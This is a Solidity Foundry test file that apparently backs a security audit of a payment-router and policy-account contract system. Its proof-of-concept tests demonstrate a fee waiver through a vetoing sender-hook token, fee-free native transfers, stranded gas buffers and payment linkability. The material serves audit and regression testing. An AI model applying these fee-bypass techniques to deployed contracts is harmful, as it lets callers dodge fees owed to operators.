// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Base} from "../Base.t.sol";
import {PolicyBase} from "../PolicyBase.t.sol";
import {PolicyRouterBase} from "../PolicyRouterBase.t.sol";
import {PolicyAccount} from "../../src/PolicyAccount.sol";
import {PolicyAccountFactory} from "../../src/PolicyAccountFactory.sol";
import {IGhostPayPolicyRouter} from "../../src/interfaces/IGhostPayPolicyRouter.sol";
import {IPolicyAccount} from "../../src/interfaces/IPolicyAccount.sol";
import {MockERC20} from "../mocks/MockERC20.sol";

// Audit 24 (docs/audits/24-contract-security-review-2026-11.md). `test_EXPLOIT_*` assert that a
// residual weakness is real; they flip when the weakness is fixed.

/// @dev Sender-side transfer hook (ERC-777 `tokensToSend` style).
interface ISenderHook {
    function tokensToSend(address to, uint256 amount) external;
}

/// @dev ERC-20 that calls a hook on the sender before every debit, if the sender opted in.
contract SenderHookToken is ERC20 {
    mapping(address account => bool on) public hooked;

    constructor() ERC20("Hooked USD", "HUSD") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }

    function setHook(bool on) external {
        hooked[msg.sender] = on;
    }

    function _update(address from, address to, uint256 value) internal override {
        if (from != address(0) && hooked[from]) ISenderHook(from).tokensToSend(to, value);
        super._update(from, to, value);
    }
}

/// @dev Funded, approved deployer whose own hook vetoes the fee debit.
contract VetoingDeployer is ISenderHook {
    function tokensToSend(address, uint256) external pure {
        revert("veto");
    }

    function run(
        SenderHookToken t,
        PolicyAccountFactory f,
        address o,
        address d,
        uint256 delay,
        bool veto
    ) external returns (address) {
        t.approve(address(f), type(uint256).max);
        t.setHook(veto);
        return f.deploy(o, d, delay, bytes32(0));
    }
}

/// @notice AUD24-01 (N-01 regression) and CONTRACTS-CORE-01 against the policy router.
contract Review24PolicyRouterAuditTest is PolicyRouterBase {
    bytes32 internal constant DOMAIN_TYPEHASH = keccak256(
        "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
    );
    bytes32 internal constant WITHDRAW_TH = keccak256(
        "Withdraw(address token,uint256 amount,uint256 deadline,uint256 nonce,bytes32 limitLeafHash)"
    );

    /// @dev Word `i` of the ABI head of `data` (after the 4-byte selector).
    function _word(bytes memory data, uint256 i) internal pure returns (bytes32 w) {
        assembly ("memory-safe") {
            w := mload(add(add(data, 36), mul(i, 32)))
        }
    }

    /// @dev Limits-tree leaf `(t, unlimited, window 0)`.
    function _unlimitedLeaf(address t) internal pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(t, type(uint256).max, uint64(0)))));
    }

    function _payCalldata(address o, bytes32 h) internal view returns (bytes memory) {
        uint256 net = GROSS - _fee(GROSS);
        return abi.encodeCall(
            IGhostPayPolicyRouter.payERC20,
            (
                IERC20(address(token)),
                _predict(o, h),
                _ref(o, h),
                GROSS,
                net,
                vm.getBlockTimestamp() + 1 hours,
                _eph(),
                _erc20Meta(address(token), net)
            )
        );
    }

    /// @dev AUD24-01: round-3 N-01 (salt-only router, commit 50881e4) was lost in consolidation.
    /// Two successful payments to two different one-time accounts of the same seller both carry
    /// the seller-constant `policyHash` as calldata word 3, so any observer links them at payment
    /// time.
    function test_EXPLOIT_AUD24_01_policyHashLinksPaymentsInCalldata() public {
        address ownerA = makeAddr("oneTimeOwnerA");
        address ownerB = makeAddr("oneTimeOwnerB");
        bytes memory a = _payCalldata(ownerA, policyHash);
        bytes memory b = _payCalldata(ownerB, policyHash);

        vm.startPrank(alice);
        (bool okA,) = address(router).call(a);
        (bool okB,) = address(router).call(b);
        vm.stopPrank();
        assertTrue(okA && okB, "both payments succeed");

        // Different stealth accounts and owners ...
        assertTrue(_word(a, 1) != _word(b, 1), "distinct accounts");
        assertTrue(_word(a, 2) != _word(b, 2), "distinct owners");
        // ... but the same public, seller-constant identifier in both transactions.
        assertEq(_word(a, 3), policyHash, "payment A exposes policyHash");
        assertEq(_word(b, 3), policyHash, "payment B exposes policyHash");
    }

    /// @dev CONTRACTS-CORE-01 (audit 05, still open): the scheme-2 gas buffer goes to the account,
    /// not to the owner EOA, and is stranded for good when the limits tree has no native leaf.
    function test_EXPLOIT_CORE01_policyBufferStrandedWithoutNativeLeaf() public {
        (address o, uint256 pk) = makeAddrAndKey("bufferOwner");
        // Single-leaf tree: the seller only accepts USDC (unlimited); root == leaf.
        bytes32 root = _unlimitedLeaf(address(token));
        bytes32 h = keccak256(abi.encode(destination, DELAY, root));
        address acct = _predict(o, h);
        uint256 net = GROSS - _fee(GROSS);

        vm.prank(alice);
        router.payERC20WithBuffer{value: 0.01 ether}(
            IERC20(address(token)),
            acct,
            _ref(o, h),
            GROSS,
            net,
            vm.getBlockTimestamp() + 1 hours,
            0.01 ether,
            _eph(),
            _erc20Meta(address(token), net)
        );
        assertEq(acct.balance, 0.01 ether, "buffer sits in the account");
        assertEq(o.balance, 0, "owner EOA got no gas");

        assertEq(factory.deploy(o, destination, DELAY, root), acct);
        bytes32 nativeLeaf = _unlimitedLeaf(address(0));
        IPolicyAccount.Withdraw memory w = IPolicyAccount.Withdraw({
            token: address(0),
            amount: 0.01 ether,
            deadline: vm.getBlockTimestamp() + 1 hours,
            nonce: 0,
            limitLeafHash: nativeLeaf
        });
        bytes32 domain = keccak256(
            abi.encode(
                DOMAIN_TYPEHASH,
                keccak256("GhostPayPolicyAccount"),
                keccak256("1"),
                block.chainid,
                acct
            )
        );
        bytes32 structHash = keccak256(
            abi.encode(WITHDRAW_TH, w.token, w.amount, w.deadline, w.nonce, w.limitLeafHash)
        );
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(pk, keccak256(abi.encodePacked("\x19\x01", domain, structHash)));
        bytes32[] memory proof = new bytes32[](0);
        IPolicyAccount.LimitProof memory lp =
            IPolicyAccount.LimitProof({limit: type(uint256).max, windowSeconds: 0, proof: proof});
        vm.expectRevert(IPolicyAccount.InvalidLimitProof.selector);
        PolicyAccount(payable(acct)).requestWithdraw(w, lp, abi.encodePacked(r, s, v));
    }
}

/// @notice CONTRACTS-CORE-02 against the scheme-1 router.
contract Review24RouterAuditTest is Base {
    /// @dev CONTRACTS-CORE-02 (audit 05, still open): `payERC20WithBuffer` moves arbitrary native
    /// value with no fee under a router announcement whose metadata only describes the ERC-20 leg.
    function test_EXPLOIT_CORE02_bufferMovesNativeValueFeeFree() public {
        MockERC20 junk = new MockERC20("Junk", "JNK", 0);
        junk.mint(alice, 1);
        vm.startPrank(alice);
        junk.approve(address(router), 1);
        router.payERC20WithBuffer{value: 10 ether}(
            IERC20(address(junk)),
            stealth,
            1,
            1,
            vm.getBlockTimestamp() + 1 hours,
            10 ether,
            _eph(),
            _erc20Meta(address(junk), 1)
        );
        vm.stopPrank();
        assertEq(stealth.balance, 10 ether, "native value delivered");
        assertEq(feeRecipient.balance, 0, "no fee on the native value");
        assertGt(_fee(10 ether), 0, "payNative would have charged a fee");
    }
}

/// @notice AUD24-02 against the factory fee waiver.
contract Review24FactoryAuditTest is PolicyBase {
    /// @dev AUD24-02: with a fee token that calls a sender hook, a funded and approved caller can
    /// veto its own fee debit; the factory reads the clean revert as "token refused a payer who can
    /// pay" and deploys fee-free. Control: the same caller without the veto pays.
    function test_EXPLOIT_AUD24_02_senderHookFeeTokenLetsCallerWaiveFee() public {
        SenderHookToken hookToken = new SenderHookToken();
        PolicyAccountFactory f =
            new PolicyAccountFactory(address(impl), address(hookToken), FLAT_FEE, feeRecipient);
        VetoingDeployer d = new VetoingDeployer();
        hookToken.mint(address(d), 10 * FLAT_FEE);

        address acct = d.run(hookToken, f, owner, destination, DELAY, true);
        assertGt(acct.code.length, 0, "deployed");
        assertEq(hookToken.balanceOf(feeRecipient), 0, "fee waived");
        assertEq(hookToken.balanceOf(address(d)), 10 * FLAT_FEE, "caller could have paid");

        d.run(hookToken, f, makeAddr("otherOwner"), destination, DELAY, false);
        assertEq(hookToken.balanceOf(feeRecipient), FLAT_FEE, "control: fee paid without veto");
    }
}
